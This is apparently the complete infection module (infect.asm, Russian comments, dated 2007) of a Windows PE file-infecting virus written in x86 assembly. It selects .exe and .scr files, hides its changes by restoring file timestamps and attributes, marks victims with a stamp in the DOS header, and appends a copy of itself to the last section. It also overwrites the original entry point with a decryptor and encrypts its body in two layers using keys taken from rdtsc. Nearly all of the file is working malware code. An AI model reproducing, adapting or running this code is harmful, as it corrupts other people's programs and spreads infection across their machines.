; ============================================================================
;	infect.asm
;
;	реализация заражения РЕ-файлов
;
; 	last change :: 28.10.2007
;
; ============================================================================



; ============================================================================================	
; in			:  file - смещение ASCIIZ-строки, содаржащей полный путь к файлу
;			:  
; out		:  
; action		:  
;			:  
; changes	:  
process_file	proc	file:DWORD
		local		pe:pe_file
		local		infected:dword
		local		pe_addr:dword
		
		
		pushad
		mov			infected, 0
		lea			eax, pe
		mov			pe_addr, eax
		
		; проверка расширения файла
		push		file
		call		check_extension
		test		eax, eax
		jz			__process_file_end

		; запомнить указатель на имя файла
		push		file
		pop			pe.file_name
	
		; попытаться открыть файл
		push		pe_addr
		call		open_pe_file
		test		eax, eax
		jz			__process_file_close_pe_file
	
		; попытаться прочитать заголовки
		push		pe_addr
		call		read_pe_headers
		test		eax, eax
		jz			__process_file_close_pe_file
		
		; проверить на заражённость
		push		pe_addr
		call		is_infected
		test		eax, eax
		jnz			__process_file_close_pe_file
		
		; прочитать заголовки секций
		push		pe_addr
		call		read_section_headers
		test		eax, eax
		jz			__process_file_close_pe_file		
		
		; узнать, можно ли заражать файл
		push		pe_addr
		call		analize_file
		test		eax, eax
		jz			__process_file_close_pe_file

IF	STAT
		add					[offset log.total_to_infect + ebx], 1
		write_log_string	[offset log.h_total_to_infect + ebx], pe.file_name
ENDIF	
IF	INFECTION
		; заразить файл
		push		pe_addr
		call		infect
		test		eax, eax
		jz			__process_file_close_pe_file
ENDIF


		mov			infected, 1

IF DEBUG
		;вывести имя файла в дебаг
		push		file
		ke32_call	OutputDebugStringA
ENDIF		

		; закрыть файл
__process_file_close_pe_file:
		push		pe_addr
		call		close_pe_file
IF	STAT
		add					[offset log.total + ebx], 1
		write_log_string	[offset log.h_total + ebx], pe.file_name
ENDIF
		
__process_file_end:
		popad
		mov			eax, infected
		ret
process_file	endp
; ============================================================================================





; ============================================================================================	
; in			:  file - смещение ASCIIZ-строки, содаржащей полный путь к файлу
; out		:  eax = 1 - расширение пригодное для анализа
;    		:  eax = 0 - расширение не пригодное для анализа
; action		:  проверяет, является ли расширение .exe или .scr
; changes	:  eax
check_extension	proc	file:DWORD
		local		result:DWORD
		pushad

		mov			result, 0

		push		file
		call		str_len
		
		mov			esi, file
		add			esi, eax					; esi - указатель на конец строки с именем файла
		mov			eax, dword ptr [esi - 4]
		or			eax, 020202000h				; привести к нижнему регистру
		xor			eax, 012345678h
		cmp			eax, 0774c3356h				; проверка на расширение ".exe"
		je			__check_extension_is_exe
		cmp			eax, 060572556h				; проверка на расширение ".scr"
		jne			__check_extension_end

__check_extension_is_exe:
		mov			result, 1

__check_extension_end:
		popad
		mov			eax, result
		ret
check_extension	endp
; ============================================================================================	





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; out		:  eax = 1 - всё прошло нормально
;    		:  eax = 0 - где-то произошла ошибка, надо вызвать close_pe_file и сваливать
; action		:  меняет аттрибуты файла, запоминая старые, открывает файл, запоминает время и размер
; changes	:  eax, pe
open_pe_file	proc	pe:DWORD
		local		result:DWORD
		pushad
		
		mov			edi, pe
		assume		edi:ptr pe_file
		mov			[edi].file_attr, 0
		mov			[edi].file_handle, 0
		mov			[edi].file_time_cr.dwLowDateTime, 0
		mov			[edi].file_size, 0
		mov			result, 0
		
		; запомнить аттрибуты файла
		push		[edi].file_name				; имя файла
		ke32_call	GetFileAttributesA
		cmp			eax, -1						; chek for [Invalid file attributes]
	IF	STAT
		je			__open_pe_file_open_error
	ELSE
		je			__open_pe_file_end
	ENDIF
		mov			[edi].file_attr, eax

		; поставить временные аттрибуты
		push		FILE_ATTRIBUTE_NORMAL		; аттрибуты
		push		[edi].file_name				; имя файла
		ke32_call	SetFileAttributesA
		test		eax, eax
	IF	STAT
		jz			__open_pe_file_open_error
	ELSE
		jz			__open_pe_file_end
	ENDIF		
		
		; открыть файл
		xor			eax, eax
		push		eax ; push 0						; hTemplateFile
		push		eax ; push 0						; dwFlagsAndAttributes
		push		OPEN_EXISTING					; dwCreationDisposition
		push		eax ; push 0						; lpSecurityAttributes 
		push		FILE_SHARE_READ					; dwShareMode
		push		GENERIC_READ or GENERIC_WRITE	; dwDesiredAccess
		push		[edi].file_name					; путь и имя
		ke32_call	CreateFileA
		cmp			eax, INVALID_HANDLE_VALUE
	IF	STAT
		je			__open_pe_file_open_error
	ELSE
		je			__open_pe_file_end
	ENDIF			
		mov			[edi].file_handle, eax
		
		; запомнить время файла
		lea			eax, [edi].file_time_lw					
		push		eax										; lpLastWriteTime
		lea			eax, [edi].file_time_la							
		push		eax										; lpLastAccessTime
		lea			eax, [edi].file_time_cr
		push		eax										; lpCreationTime
		push		[edi].file_handle						; hFile
		ke32_call	GetFileTime
		test		eax, eax
	IF	STAT
		jz			__open_pe_file_open_error
	ELSE
		jz			__open_pe_file_end
	ENDIF			
		
		; получение размера файла и его проверка
		push		0
		push		[edi].file_handle
		ke32_call	GetFileSize
		cmp			eax, max_file_size			; не больше ли максимально допустимого размера?
	IF	STAT
		jg			__open_pe_file_size_big
	ELSE
		jg			__open_pe_file_end
	ENDIF
		cmp			eax, min_file_size			; не меньше ли минимально допустимого размера?
	IF	STAT
		jl			__open_pe_file_size_small
	ELSE
		jl			__open_pe_file_end
	ENDIF		
		mov			[edi].file_size, eax
		
		mov			result, 1

IF	STAT
		jmp			__open_pe_file_end
__open_pe_file_open_error:
		add			[offset log.open_errors + ebx], 1
		write_log_string	[offset log.h_open_errors + ebx], [edi].file_name
		jmp			__open_pe_file_end
__open_pe_file_size_big:
		add			[offset log.large_size + ebx], 1
		write_log_string	[offset log.h_large_size + ebx], [edi].file_name
		jmp			__open_pe_file_end
__open_pe_file_size_small:
		write_log_string	[offset log.h_small_size + ebx], [edi].file_name
		add			[offset log.small_size + ebx], 1
ENDIF		

__open_pe_file_end:
		assume		edi:NOTHING
		popad
		mov			eax, result
		ret
open_pe_file	endp
; ============================================================================================	





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; out		:  nothing
; action		:  восстанавливает аттрибуты файла, закрывает файл, восстанавливает время
; changes	:  nothing
close_pe_file	proc	pe:DWORD
		pushad
		
		mov			edi, pe
		assume		edi:ptr pe_file

		cmp			[edi].file_time_cr.dwLowDateTime, 0		; ! тут возможна ошибка, если гетФайлТайм при неудаче сюда что-то записывает
		jz			__close_pe_file_close_file

		; восстановить время
__close_pe_file_restore_time:
		lea			eax, [edi].file_time_lw					
		push		eax										; lpLastWriteTime
		lea			eax, [edi].file_time_la					
		push		eax										; lpLastAccessTime
		lea			eax, [edi].file_time_cr
		push		eax										; lpCreationTime
		push		[edi].file_handle						; hFile
		ke32_call	SetFileTime

		; закрыть хэндл файла
__close_pe_file_close_file:
		cmp			[edi].file_handle, 0
		jz			__close_pe_file_restore_attributes
		push		[edi].file_handle
		ke32_call	CloseHandle

		; восстановить аттрибуты
__close_pe_file_restore_attributes:
		cmp			[edi].file_attr, 0
		jz			__close_pe_file_end
		push		[edi].file_attr			; аттрибуты
		push		[edi].file_name			; имя файла
		ke32_call	SetFileAttributesA
		
__close_pe_file_end:
		assume		edi:NOTHING
		popad
		ret
close_pe_file	endp
; ============================================================================================	





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; out		:  nothing
; action		:  заполняет поля дос-заголовка, сигнатуры, файлового заголовка и опционального заголовка
; changes	:  pe
read_pe_headers	proc	pe:DWORD
		local		result:dword
		local		bytes_rw:dword
		pushad
		
		mov			result, 0
		
		mov			edi, pe
		assume		edi:ptr pe_file

		; прочеть IMAGE_DOS_HEADER
		read_file	[edi].file_handle, [edi].dos_h, sizeof IMAGE_DOS_HEADER, bytes_rw
		test		eax, eax
		jz			__read_pe_headers_end
		cmp			bytes_rw, sizeof IMAGE_DOS_HEADER
		jne			__read_pe_headers_end
		
		; проверка на валидность дос-заголовка
		cmp			[edi].dos_h.e_magic, IMAGE_DOS_SIGNATURE
	IF	STAT
		jne			__read_pe_headers_not_pe
	ELSE
		jne			__read_pe_headers_end
	ENDIF		
		
		; переместить fp на IMAGE_NT_HEADERS
		mov			eax, [edi].dos_h.e_lfanew
		set_fp		[edi].file_handle, eax, FILE_BEGIN
		cmp			eax, -1								; INVALID_SET_FILE_POINTER
		je			__read_pe_headers_end
	
		; прочесть сигнатуру РЕ
		read_file	[edi].file_handle, [edi].signature, 4, bytes_rw
		test		eax, eax
		jz			__read_pe_headers_end
		cmp			bytes_rw, 4
		jne			__read_pe_headers_end

		; проверить сигнатуру РЕ
		cmp			[edi].signature, IMAGE_NT_SIGNATURE
	IF	STAT
		jne			__read_pe_headers_not_pe
	ELSE
		jne			__read_pe_headers_end
	ENDIF		

		; прочесть IMAGE_FILE_HEADER
		read_file	[edi].file_handle, [edi].file_h, sizeof IMAGE_FILE_HEADER, bytes_rw
		test		eax, eax
		jz			__read_pe_headers_end
		cmp			bytes_rw, sizeof IMAGE_FILE_HEADER
		jne			__read_pe_headers_end		

		; запоминаем смещение IMAGE_OPTIONAL_HEADER
		mov			eax, [edi].dos_h.e_lfanew
		add			eax, sizeof IMAGE_FILE_HEADER + 4
		mov			[edi].p_opt_h, eax

		; на данном этапе fp указывает на  IMAGE_OPTIONAL_HEADER; читаем его
		xor			edx, edx
		mov 		dx, [edi].file_h.SizeOfOptionalHeader
		cmp			edx, 224										; если размер не равен 224 - то это 64 разрядный экзешнег
	IF	STAT
		jne			__read_pe_headers_x64
	ELSE
		jne			__read_pe_headers_end
	ENDIF
		read_file	[edi].file_handle, [edi].opt_h, edx, bytes_rw
		test		eax, eax
		jz			__read_pe_headers_end
		xor			eax, eax
		mov			ax, [edi].file_h.SizeOfOptionalHeader
		cmp			bytes_rw, eax
		jne			__read_pe_headers_end
		
		mov			result, 1
		
IF	STAT
		jmp			__read_pe_headers_end
__read_pe_headers_not_pe:
		add			[offset log.not_pe + ebx], 1
		write_log_string	[offset log.h_not_pe + ebx], [edi].file_name
		jmp			__read_pe_headers_end
__read_pe_headers_x64:
		add			[offset log.x64 + ebx], 1
		write_log_string	[offset log.h_x64 + ebx], [edi].file_name
ENDIF
		
__read_pe_headers_end:
		assume		edi:NOTHING
		popad
		mov			eax, result
		ret
read_pe_headers	endp
; ============================================================================================	





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; out		:  eax = 1 - файл уже инфецирован
;    		:  eax = 0 - файл чист, как капля росы :)
; action		:  проверяет, заражён ли уже текущий файл
; changes	:  eax
is_infected	proc	pe:DWORD
		local		result:dword
		pushad
		
		mov			result, 0
		
		mov			edi, pe
		assume		edi:ptr pe_file

		; проверка на заражённость
		mov			ax, [edi].dos_h.e_res
		cmp			ax, 0ffffh
		jne			__is_infected_end		
		
		mov			result, 1
		
__is_infected_end:
		assume		edi:NOTHING
		popad
		mov			eax, result
		ret
is_infected	endp
; ============================================================================================	





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
;   			:  file pointer должен указывать на начало заголовка первой секции
; out		:  eax = 1 - вся необходимая информация найдена
;    		:  eax = 0 - что-то важное не было получено при обработке
; action		:  находит последнюю секцию, считывает её заголовок
;       		:  находит секцию, где живёт ЕР; сохраняет байты из ЕР в РЕ-структуру
; changes	:  eax
read_section_headers	proc	pe:DWORD
		local		result:dword
		local		bytes_rw:dword
		local		sec_h_current:IMAGE_SECTION_HEADER
		local		p_sec_h_current:dword
		pushad
		
		mov			result, 0
		
		mov			edi, pe
		assume		edi:ptr pe_file
		mov			[edi].p_ep, 0
		
	; fp указывает на первый заголовок секции
	; начинаем поиск последней секции виртуально и физически, параллельно ища секцию, где находится ЕР
		; запомнить смещение первойго IMAGE_SECTION_HEADERа
		xor			eax, eax
		mov 		ax, [edi].file_h.SizeOfOptionalHeader
		add			eax, [edi].p_opt_h
		mov			p_sec_h_current, eax
	
		mov			cx, [edi].file_h.NumberOfSections
		mov			[edi].sec_h_last.PointerToRawData, 0
		mov			[edi].sec_h_last.VirtualAddress, 0

__read_section_headers_next_sect:
		;   прочесть IMAGE_SECTION_HEADER
		push		ecx
		read_file	[edi].file_handle, sec_h_current, sizeof IMAGE_SECTION_HEADER, bytes_rw
		pop			ecx
		test		eax, eax
		jz			__read_section_headers_end
		cmp			bytes_rw, sizeof IMAGE_SECTION_HEADER
		jne			__read_section_headers_end		

		; проверяем, не тут ли  находится ЕР
		mov 		eax, sec_h_current.VirtualAddress
		.IF eax <= [edi].opt_h.AddressOfEntryPoint
			add		eax, sec_h_current.Misc.VirtualSize
			.IF eax > [edi].opt_h.AddressOfEntryPoint					
				mov			eax, sec_h_current.PointerToRawData
				mov			edx, [edi].opt_h.FileAlignment
				call 		align_down
				add			eax, [edi].opt_h.AddressOfEntryPoint
				sub			eax, sec_h_current.VirtualAddress
				mov			[edi].p_ep, eax							; если нашли секцию, где живёт ЕР - то вичислить её файловое смещение и запомнить
				push		p_sec_h_current
				pop			[edi].p_sec_h_ep						; а так же запомнить смещение заголовка секции, где живёт ЕР
			.ENDIF
		.ENDIF
	
		xor			edx, edx
		mov			eax, sec_h_current.PointerToRawData
		cmp			eax, [edi].sec_h_last.PointerToRawData
		jl			__read_section_headers_cmp_va			; если файловый указатель "текущей" секции меньше, то перейти к сравнению RVA
		inc			edx
__read_section_headers_cmp_va:
		mov			eax, sec_h_current.VirtualAddress
		cmp			eax, [edi].sec_h_last.VirtualAddress
		jl			__read_section_headers_compare_sections	; если RVA "текущей" секции меньше, то перейти к анализу ситуации
		inc			edx
__read_section_headers_compare_sections:
		test		edx, edx								; edx == 0 ?  если да, то "текущая" секция меньше "последней"
		jz			__read_section_headers_refresh_cx	; и мы переходим на следующую секцию
		push		p_sec_h_current							; тут известно, что edx != 0. тогда как минимум один аргумент сравнения "текущей" секции больше "последней"
		pop			[edi].p_sec_h_last						; устанвливаем указатель на последнюю секцию равным текущему
__read_section_headers_refresh_cx:
		add			p_sec_h_current, sizeof IMAGE_SECTION_HEADER
		dec			cx
		jnz			__read_section_headers_next_sect
		
		; проверяем, найдена ли секция, содержащая ЕР
		cmp			[edi].p_ep, 0
IF	STAT
		je			__read_section_headers_ep_not_found
ELSE		
		je			__read_section_headers_end
ENDIF

		; записать в sec_h_last содаржание заголовка последней секции
		set_fp		[edi].file_handle, [edi].p_sec_h_last, FILE_BEGIN
		cmp			eax, -1								; INVALID_SET_FILE_POINTER
		je			__read_section_headers_end
		read_file	[edi].file_handle, [edi].sec_h_last, sizeof IMAGE_SECTION_HEADER, bytes_rw
		test		eax, eax
		jz			__read_section_headers_end
		cmp			bytes_rw, sizeof IMAGE_SECTION_HEADER
		jne			__read_section_headers_end			

		; проверть, не совпадают ли последняя секция и секция точки входа
		mov			eax, [edi].p_sec_h_last
		cmp			eax, [edi].p_sec_h_ep
		jz			__read_section_headers_success
		; если секции не совпадают, то записать в sec_h_ep содаржание заголовка секции, где живёт ЕР
		set_fp		[edi].file_handle, [edi].p_sec_h_ep, FILE_BEGIN
		cmp			eax, -1								; INVALID_SET_FILE_POINTER
		je			__read_section_headers_end
		read_file	[edi].file_handle, [edi].sec_h_ep, sizeof IMAGE_SECTION_HEADER, bytes_rw
		test		eax, eax
		jz			__read_section_headers_end
		cmp			bytes_rw, sizeof IMAGE_SECTION_HEADER
		jne			__read_section_headers_end

__read_section_headers_success:
		mov			result, 1
		
IF	STAT
		jmp			__read_section_headers_end
__read_section_headers_ep_not_found:
		write_log_string	[offset log.h_ep_not_found + ebx], [edi].file_name
		add			[offset log.ep_not_found + ebx], 1
ENDIF

__read_section_headers_end:
		assume		edi:NOTHING
		popad
		mov			eax, result
		ret
read_section_headers	endp
; ============================================================================================	





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; out		:  eax = 1 - файл пригоден для заражения
;    		:  eax = 0 - файл не пригоден для заражения
; action		:  проверяет на равенство нулю поле чексуммы файла
;       		:  проверяет на нулевой размер последнюю секцию файла
;       		:  проверяет на наличие оверлея
;       		:  вычисляет адрес, куда будет происходить инжектирование кода
; changes	:  eax, p_injection_addr
analize_file	proc	pe:DWORD
		local		result:dword
		pushad
		
		mov			result, 0
		
		mov			edi, pe
		assume		edi:ptr pe_file
		
		; проверяем последнюю секцию на равенство нулю
		cmp			[edi].sec_h_last.Misc.VirtualSize, 0
		je			__analize_file_end
		mov			eax, [edi].sec_h_last.SizeOfRawData
		test		eax, eax
IF	STAT
		jz			__analize_file_null_last_section
ELSE		
		jz			__analize_file_end
ENDIF		
		add			eax, [edi].sec_h_last.PointerToRawData
		mov			[edi].p_injection_addr, eax				; eax = файловому смещению, куда в дальнейшем, при благоприятных остоятельствах, проведём инжект

		; проверка на наличие оверлея 		
		cmp			eax, [edi].file_size
IF	STAT
		jnz			__analize_file_overlay
ELSE
		jnz			__analize_file_end
ENDIF

		; проверка чексуммы
		cmp			[edi].opt_h.CheckSum, 0
IF	STAT
		jne			__analize_file_cheksum_not_null
ELSE
		jne			__analize_file_end
ENDIF

		mov			result, 1

IF	STAT
		jmp			__analize_file_end
__analize_file_cheksum_not_null:
		write_log_string	[offset log.h_cheksum_not_null + ebx], [edi].file_name
		add			[offset log.cheksum_not_null + ebx], 1
		jmp			__analize_file_end
__analize_file_overlay:
		add			[offset log.overlay + ebx], 1
		write_log_string	[offset log.h_overlay + ebx], [edi].file_name
		jmp			__analize_file_end
__analize_file_null_last_section:
		write_log_string	[offset log.h_null_last_section + ebx], [edi].file_name
		add			[offset log.null_last_section + ebx], 1
ENDIF

__analize_file_end:
		assume		edi:NOTHING
		popad
		mov			eax, result
		ret
analize_file	endp
; ============================================================================================	





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; out		:  eax = 1 - файл успешно заражён
;    		:  eax = 0 - файл не заражён
; action		:  заражает файл
; changes	:  eax
infect	proc	pe:DWORD
		local		result:dword
		local		bytes_rw:dword

		local		layer1_eax:dword
		local		layer1_edx:dword
		local		layer2_eax:dword
		local		layer2_edx:dword
		
		
		pushad
		
		mov			result, 0
		
		mov			edi, pe
		assume		edi:ptr pe_file

		; править заголовки
		push		edi
		call		modify_headers

		; поставить штамп "заражён"
		push		edi
		call		set_infected_stamp

		; записать в файл модифицированные заголовки
		push		edi
		call		write_headers


		; скопировать себя в стек
		mov			esi, offset virus_start
		add			esi, ebx
		mov			ecx, VIRUS_SIZE / 4
		sub			esp, VIRUS_SIZE
		mov			[edi].local_copy, esp
		push		edi
		mov			edi, [edi].local_copy
		rep			movsd
		pop			edi

		; прочитать ОЕР в стековое тело
		push		edi
		call		read_oep
		test		eax, eax
		jz			__infect_end		
		
		; заполнить в стековом теле виря адрес возврата в оригинальную точку входа
		mov			eax, [edi].opt_h.AddressOfEntryPoint
		add			eax, [edi].opt_h.ImageBase
		mov			esi, [edi].local_copy
		add			esi, OLD_ENTRY_OFFSET
		mov			dword ptr [esi], eax
		
	; создаём расшифровшик 1го уровня
		; вычислить ключ шифрования 1го уровня
		rdtsc
		imul		edx, eax			; в edx:eax - значение крипт-ключa
		; сохраняем для зашифровки
		mov			layer1_eax, eax
		mov			layer1_edx, edx
		; прописать ключи шифрования 1го уровня в стековом теле
		mov			esi, [edi].local_copy
		add			esi, LAYER1_ROR_KEY_OFFSET
		mov			dword ptr [esi], edx
		mov			esi, [edi].local_copy
		add			esi, LAYER1_INC_KEY_OFFSET
		mov			dword ptr [esi], eax
		; прописать адреса расшифровки 1го уровня в стековом теле
		mov			esi, [edi].local_copy
		add			esi, LAYER1_ESI_OFFSET
		mov			eax, [edi].virus_ep
		mov			dword ptr [esi], eax
		; копируем расшифровщик 1го уровня в ОЕР
		push		edi			; pe-структура
		call		write_oep
		
	; создаём расшифровшик 2го уровня
		rdtsc												; в edx:eax - значение крипт-ключa
		imul		edx, [edi].file_time_la.dwLowDateTime
		imul		eax, [edi].file_time_la.dwHighDateTime
		; сохраняем для зашифровки
		mov			layer2_eax, eax
		mov			layer2_edx, edx
		; прописать ключи шифрования 2го уровня в стековом теле
		mov			esi, [edi].local_copy
		add			esi, LAYER2_ROR_KEY_OFFSET
		mov			dword ptr [esi], edx
		mov			esi, [edi].local_copy
		add			esi, LAYER2_INC_KEY_OFFSET
		mov			dword ptr [esi], eax
		
	; зашифровать стековое тело 2м слоем
		push		ebx
		push		edi
		mov			ebx, layer2_eax
		mov			edx, layer2_edx
		; обозначить границы зашифровки
		mov			esi, [edi].local_copy
		add			esi, ENCODED_PART_OFFSET	; адрес начала шифруемых данных
		mov			edi, esi
		cld
		mov			ecx, ENCODED_PART_SIZE / 4	; размер 2го слоя в DWORD'ах
	__infect_encode2_loop:
		; цикл зашифровки
		rol			edx, 13
		add			edx, ebx
		add			ebx, ecx
		lodsd
		xor			eax, edx
		stosd
		dec			ecx
		jnz			__infect_encode2_loop
		pop			edi
		pop			ebx
		
	; зашифровать стековое тело 1м слоем
		push		ebx
		push		edi
		mov			ebx, layer1_eax
		mov			edx, layer1_edx
		; обозначить границы зашифровки
		mov			esi, [edi].local_copy
		mov			edi, esi
		cld
		mov			ecx, VIRUS_SIZE / 4		; размер вируса в DWORD'ах
	__infect_encode1_loop:
		; цикл зашифровки
		ror			edx, 7
		sub			edx, ebx
		sub			ebx, ecx
		lodsd
		xor			eax, edx
		stosd
		dec			ecx
		jnz			__infect_encode1_loop
		pop			edi
		pop			ebx		



		; скопировать себя в тело файла-жертвы
		set_fp		[edi].file_handle, [edi].p_injection_addr, FILE_BEGIN
		cmp			eax, -1								; INVALID_SET_FILE_POINTER
		je			__infect_file_crashed
		; 		
		push		NULL
		lea			eax, bytes_rw
		push		eax
		push		VIRUS_SIZE
		push		[edi].local_copy
		push		[edi].file_handle
		ke32_call	WriteFile
		test		eax, eax
		jz			__infect_file_crashed
		cmp			bytes_rw, VIRUS_SIZE
		jne			__infect_file_crashed		

		; отбалансировать стек
		add			esp, VIRUS_SIZE

		; выровнять файл
		set_fp		[edi].file_handle, [edi].new_file_size, FILE_BEGIN
		cmp			eax, -1								; INVALID_SET_FILE_POINTER
		je			__infect_file_crashed
		; выставить конец файла
		push		[edi].file_handle
		ke32_call	SetEndOfFile
		test		eax, eax
		jz			__infect_file_crashed
		jmp			__infect_success
		
__infect_file_crashed:
		
		jmp			__infect_end

__infect_success:		
		mov			result, 1
IF	SLEEP_AFTER_SUCCESSFUL_INFECTION
		push		SLEEP_AFTER_SUCCESSFUL_INFECTION_PERIOD
		ke32_call	Sleep
ENDIF		
		
__infect_end:
		assume		edi:NOTHING
		popad
		mov			eax, result
		ret
infect	endp
; ============================================================================================





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; out		:  nothing
; action		:  пишет модифицированные заголовки секций в заражаемый файл
; changes	:  nothing
write_headers	proc	pe:DWORD
		local		bytes_rw:dword
		pushad

		mov			edi, pe
		assume		edi:ptr pe_file

		; перейти к началу файла
		set_fp		[edi].file_handle, 0, FILE_BEGIN
		; переписать дос-заголовок
		write_file	[edi].file_handle, [edi].dos_h, sizeof IMAGE_DOS_HEADER, bytes_rw
		
		; перейти к опциональному заголовку
		set_fp		[edi].file_handle, [edi].p_opt_h, FILE_BEGIN
		; записать опциональный заголовок
		xor			edx, edx
		mov			dx, [edi].file_h.SizeOfOptionalHeader
		write_file	[edi].file_handle, [edi].opt_h, edx, bytes_rw

		; перейти к заголовку последней секции
		set_fp		[edi].file_handle, [edi].p_sec_h_last, FILE_BEGIN
		; перезаписать заголовок последней секции
		write_file	[edi].file_handle, [edi].sec_h_last, sizeof IMAGE_SECTION_HEADER, bytes_rw

		; проверить, не содержит ли в себе последняя секция точку входа
		mov			eax, [edi].p_sec_h_last
		cmp			eax, [edi].p_sec_h_ep
		je			__write_headers_end
		; перейти к заголовку секции, где живёт ЕР
		set_fp		[edi].file_handle, [edi].p_sec_h_ep, FILE_BEGIN
		; перезаписать заголовок секции, где живёт ЕР
		write_file	[edi].file_handle, [edi].sec_h_ep, sizeof IMAGE_SECTION_HEADER, bytes_rw

__write_headers_end:
		assume		edi:NOTHING
		popad
		ret
write_headers	endp
; ============================================================================================	





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; out		:  
; action		:  модифицирует заголовки секций для работы вируса
; changes	:  
modify_headers	proc	pe:DWORD
		pushad
	
		mov			edi, pe
		assume		edi:ptr pe_file
		
		; вычисляем VA точки входа в вирь
		push		[edi].opt_h.ImageBase
		pop			[edi].virus_ep
		mov			eax, [edi].sec_h_last.VirtualAddress
		add			eax, [edi].sec_h_last.SizeOfRawData
		add			[edi].virus_ep, eax
		
		; править физический размер секции и высчитываем новый размер файла
		mov			eax, [edi].sec_h_last.SizeOfRawData
		add			eax, VIRUS_SIZE
		mov			edx, [edi].opt_h.FileAlignment
		call		align_up
		mov			[edi].sec_h_last.SizeOfRawData, eax
		add			eax, [edi].sec_h_last.PointerToRawData
		mov			[edi].new_file_size, eax
		
		; править виртуальный размер секции
		mov			eax, [edi].sec_h_last.SizeOfRawData
		mov			edx, [edi].opt_h.SectionAlignment
		call		align_up
		mov			[edi].sec_h_last.Misc.VirtualSize, eax
		
		; править флаги последней секции
		mov			eax, [edi].sec_h_last.Characteristics
		mov			edx, IMAGE_SCN_MEM_DISCARDABLE
		neg			edx
		and			eax, edx						; снять флаг DISCARDABLE
		or			eax, IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_READ		; поставить флаги на запись и чтение
		mov			[edi].sec_h_last.Characteristics, eax
		
		; править image size
		mov			eax, [edi].sec_h_last.Misc.VirtualSize
		add			eax, [edi].sec_h_last.VirtualAddress
		mov			[edi].opt_h.SizeOfImage, eax		
		
		; проверть, не совпадают ли последняя секция и секция точки входа
		mov			eax, [edi].p_sec_h_last
		cmp			eax, [edi].p_sec_h_ep
		jz			__modify_headers_end
		; если секции не совпадают, то модифицировать содаржание флагов секции, где живёт ЕР
		mov			eax, [edi].sec_h_ep.Characteristics
		or			eax, IMAGE_SCN_MEM_WRITE
		mov			[edi].sec_h_ep.Characteristics, eax
		
__modify_headers_end:		
		assume		edi:NOTHING
		popad
		ret
modify_headers	endp
; ============================================================================================





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; 			:  предполагается, что к этому времени уже существует стековая копия
; out		:  eax = 1 - OEP байты прочитаны успешно
;    		:  eax = 0 - облом
; action		:  считывает в стековое тело байты из ОЕР
; changes	:  eaх
read_oep	proc	pe:DWORD
		local		result:dword
		local		bytes_rw:dword
		pushad
		
		mov			result, 0
		
		mov			edi, pe
		assume		edi:ptr pe_file
		
		set_fp		[edi].file_handle, [edi].p_ep, FILE_BEGIN
		cmp			eax, -1								; INVALID_SET_FILE_POINTER
		je			__read_oep_end
		;
		push		NULL					; lpOverlapped
		lea			eax, bytes_rw
		push		eax						; lpNumberOfBytesRead
		push		OEP_CODE_SIZE			; nNumberOfBytesToRead
		mov			eax, [edi].local_copy
		add			eax, OLD_EP_BYTES_OFFSET
		push		eax						; lpBuffer
		push		[edi].file_handle		; hFile
		ke32_call	ReadFile		
		test		eax, eax
		jz			__read_oep_end
		cmp			bytes_rw, OEP_CODE_SIZE
		jne			__read_oep_end
		
		mov			result, 1

__read_oep_end:
		assume		edi:NOTHING
		popad
		mov			eax, result
		ret
read_oep	endp
; ============================================================================================	





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; 			:  предполагается, что в стековой копии к этому времени уже приготовлен расшифровщик первого уровня
; out		:  nothing
; action		:  перезаписывает байты в оригинальной точке входа расшифровщиком 1го слоя
; changes	:  nothing
write_oep	proc	pe:DWORD
		local		bytes_rw:dword
		pushad

		mov			edi, pe
		assume		edi:ptr pe_file

		; поставить fp на файловое смещение точки входа
		set_fp		[edi].file_handle, [edi].p_ep, FILE_BEGIN

		; записать расшифровщик 1го уровня в ОЕР
		push		NULL						; lpOverlapped
		lea			eax, bytes_rw
		push		eax							; lpNumberOfBytesWritten
		push		OEP_CODE_SIZE				; nNumberOfBytesToWrite
		mov			eax, [edi].local_copy
		add			eax, LAYER1_DECODER_OFFSET
		push		eax							; lpBuffer
		push		[edi].file_handle			; hFile
		ke32_call	WriteFile

		assume		edi:NOTHING
		popad
		ret
write_oep	endp
; ============================================================================================	





; ============================================================================================	
; in			:  pe - указатель на информационную структуру
; out		:  
; action		:  устанавливает штамп "заражён"
; changes	:  
set_infected_stamp	proc	pe:DWORD
		pushad

		mov			edi, pe
		assume		edi:ptr pe_file

		; поставить флаг "заражён"
		mov			[edi].dos_h.e_res, 0ffffh

		assume		edi:NOTHING
		popad
		ret
set_infected_stamp	endp
; ============================================================================================